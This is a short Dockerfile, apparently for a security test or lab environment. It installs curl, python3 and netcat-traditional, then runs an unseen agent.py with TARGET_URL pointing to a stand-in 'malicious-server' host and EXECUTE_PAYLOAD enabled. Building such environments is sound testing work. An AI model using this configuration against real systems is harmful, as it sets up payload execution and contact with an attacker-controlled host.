FROM debian:bookworm-slim

RUN apt-get update && \
    apt-get install -y --no-install-recommends \
      curl python3 ca-certificates netcat-traditional && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY agent.py .

ENV TARGET_URL=http://malicious-server:8000
ENV EXECUTE_PAYLOAD=true

CMD ["python3", "agent.py"]
